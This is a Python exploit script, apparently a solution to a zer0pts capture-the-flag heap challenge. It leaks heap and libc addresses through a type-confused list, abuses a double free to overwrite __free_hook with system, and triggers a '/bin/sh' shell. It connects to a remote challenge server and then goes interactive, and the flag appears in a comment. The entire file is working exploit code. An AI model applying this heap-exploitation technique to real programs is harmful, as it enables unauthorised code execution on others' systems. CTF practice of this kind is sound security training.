#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'.'}, 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'.'}}, \
                        remote  = {'host':'13.231.207.73', 'port':9007})
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']

libc = binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    dl = DiyList(conn)

    dl.add('str', 'a')                      # 0
    addr_heap_base = int(dl.get(0, 'long')) - 0x2b0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    dl.add('long', addr_got_main)           # 1
    addr_libc_main = u(dl.get(1, 'str'))
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    dl.edit(1, 'long', addr_heap_base + 0x2b0)
    dl.delete(0)
    dl.delete(0)

    dl.add('str', p64(addr_libc_free_hook)) # 0
    dl.add('str', '/bin/sh\x00')            # 1
    dl.add('str', p64(addr_libc_system))    # 2

    dl.delete(1)

class DiyList:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, tp, data):
        self.sendlineafter('> ', '1')
        self.sendlineafter(': ', '1' if tp == 'long' else '2' if tp == 'double' else '3')
        self.sendlineafter('Data: ', str(data))

    def get(self, idx, tp):
        self.sendlineafter('> ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter(': ', '1' if tp == 'long' else '2' if tp == 'double' else '3')
        self.recvuntil('Data: ')
        return self.recvuntil('\n1. list_add', drop=True)

    def edit(self, idx, tp, data):
        self.sendlineafter('> ', '3')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter(': ', '1' if tp == 'long' else '2' if tp == 'double' else '3')
        self.sendlineafter('Data: ', str(data))

    def delete(self, idx):
        self.sendlineafter('> ', '4')
        self.sendlineafter('Index: ', str(idx))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # zer0pts{m4y_th3_typ3_b3_w1th_y0u}

if __name__=='__main__':
    main()

#==========
